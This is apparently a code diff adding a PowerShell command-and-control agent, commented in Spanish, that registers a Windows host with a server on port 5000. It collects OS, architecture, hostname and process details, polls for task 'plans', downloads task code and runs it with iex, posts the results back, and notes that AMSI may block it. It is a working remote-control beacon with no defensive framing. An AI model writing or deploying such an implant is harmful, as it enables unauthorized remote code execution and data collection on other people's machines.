@@ -1,0 +1,180 @@
+
+
+function consola
+{
+    param(
+    [String] $id
+    )
+
+    $global:id = ""
+    $global:remoteip = "$IP"
+    if($id)
+    {
+        sleep 5
+        $global:id = $id
+        #proceso desdoblado
+        #registramos proceso para un nuevo ID en base de datos. Trazabilidad ON
+        $nameOS = (Get-WmiObject Win32_OperatingSystem).Name.Split("|")[0]
+        $archOS = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+        $machine = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
+        $hi = @{id=$global:id;name=$nameOS;arch=$archOS;machine=$machine;pid=$PID}
+
+        $resp = invoke-webrequest -UseBasicParsing -Method POST -Body $hi "http://$IP:5000/hi2"
+
+        #solicitamos tareas pendientes
+        $plan = invoke-webrequest -UseBasicParsing -method POST -body @{id=$global:id} "http://$IP:5000/givemeplan" | ConvertFrom-JSON
+
+        #clasificamos tareas
+        [System.Collections.ArrayList]$list = @{}
+        $i=0
+        $idplan = $plan.plan
+        $id = $plan.id
+
+        while($i -lt $plan.ntasks)
+        {
+            $plan.tasks."t$i"
+            $list.Add($plan.tasks."t$i")
+            $i = $i + 1
+        }
+
+
+        #enumeramos funciones y vamos ejecutando
+        foreach($task in $list)
+        {
+
+            $execute = @{results="AMSI may have blocked it or a function execution may have failed";succes=$False}
+
+            #Pedimos la funcion a givemetask
+            $function = invoke-webrequest -UseBasicParsing -method POST -body @{id=$global:id;plan=$idplan;funcion=$task.function} "http://$IP:5000/givemetask" | ConvertFrom-JSON
+            $id = $function.id
+            $plan = $function.plan
+            $funcion = $function.funcion
+            $execute = $function.funcion | iex
+
+            # $good = "OK"
+
+            # if($result.Count -eq 0)
+            # {
+            #     $result = $Error | select -First 2000
+            #     $good = "NOT OK"
+            # }
+
+            #Devolver resultado al nodo central junto a ID Warrior e ID Plan
+            #$results = invoke-webrequest -UseBasicParsing -method POST -body @{id=$global:id;plan=$idplan;idfunction=$task.idfunction;funcion=$task.function;resultado=($result|Out-String);good=$good} "http://$IP:5000/putresult"
+            $success = 1
+            if($execute.success)
+            {
+                echo "ejecución correcta"
+                $success = 0
+            }
+            $exec = invoke-webrequest -UseBasicParsing -method POST -body @{id=$global:id;plan=$idplan;idfunction=$task.idfunction;funcion=$task.function;resultado=$execute.results;good=$success} "http://$IP:5000/putresult"
+
+            if($task.die -eq "0")
+            {
+                echo "muere"
+                #Posible notificación de muerte al server
+                exit
+            }
+
+        }
+
+
+    }
+    else{
+
+
+
+        $global:id = -join ((65..90) + (48..57) + (97..122)|Get-Random -Count 5 |% {[char]$_})
+        $global:id = "P"+$global:id
+
+        $nameOS = (Get-WmiObject Win32_OperatingSystem).Name.Split("|")[0]
+        $archOS = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+        $machine = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
+        $hi = @{id=$global:id;name=$nameOS;arch=$archOS;machine=$machine;pid=$PID}
+
+        $resp = invoke-webrequest -UseBasicParsing -Method POST -Body $hi "http://$IP:5000/hi"
+
+        if(-not $resp.content.equals("200"))
+        {
+            exit
+        }
+
+        $condition = $true
+
+        while($condition)
+        {
+            #Preguntamos si hay plan
+            $plan = invoke-webrequest -UseBasicParsing -Method POST -body @{id=$global:id} "http://$IP:5000/getplan"
+
+            #Si hay plan ejecutamos, si no dormimos
+            if($plan.content.equals("false"))
+            {
+                sleep(5)
+            }
+            else #Ejecutamos plan (plan)
+            {
+                $plan = invoke-webrequest -UseBasicParsing -method POST -body @{id=$global:id} "http://$IP:5000/givemeplan" | ConvertFrom-JSON
+                $condition = $false
+
+                [System.Collections.ArrayList]$list = @{}
+                $i=0
+                $idplan = $plan.plan
+                $id = $plan.id
+
+                while($i -lt $plan.ntasks)
+                {
+                    $plan.tasks."t$i"
+                    $list.Add($plan.tasks."t$i")
+                    $i = $i + 1
+                }
+
+                foreach($task in $list)
+                {
+                    echo $task
+                    $execute = @{results="AMSI may have blocked it or a function execution may have failed";succes=$False}
+
+                    #Pedimos la funcion a givemetask
+                    $function = invoke-webrequest -UseBasicParsing -method POST -body @{id=$global:id;plan=$idplan;funcion=$task.function} "http://$IP:5000/givemetask" | ConvertFrom-JSON
+                    $id = $function.id
+                    $plan = $function.plan
+                    $funcion = $function.funcion
+                    $execute = $function.funcion | iex
+                    $result = $execute
+
+                    # $good = "OK"
+
+
+                    # if($result.Count -eq 0)
+                    # {
+                    #     $result = $Error | select -First 2000
+                    #     $good = "NOT OK"
+                    # }
+
+                    #put results (good or not good and result execution)
+                    $success = 1
+                    if($execute.success)
+                    {
+                        echo "ejecución correcta"
+                        $success = 0
+                    }
+
+                    $exec = invoke-webrequest -UseBasicParsing -method POST -body @{id=$global:id;plan=$idplan;idfunction=$task.idfunction;funcion=$task.function;resultado=$execute.results;good=$success} "http://$IP:5000/putresult"
+                    
+                    if($task.die -eq "0")
+                    {
+                        echo "muere"
+                        sleep 5
+                        #Spawn Process (And not Bye request)
+                        exit
+                    }
+
+                }
+
+
+            }
+        }
+    }
+    #bye request
+    $resp = invoke-webrequest -UseBasicParsing -Method POST -Body @{id=$global:id}  "http://$IP:5000/bye"
+    sleep(5)
+}
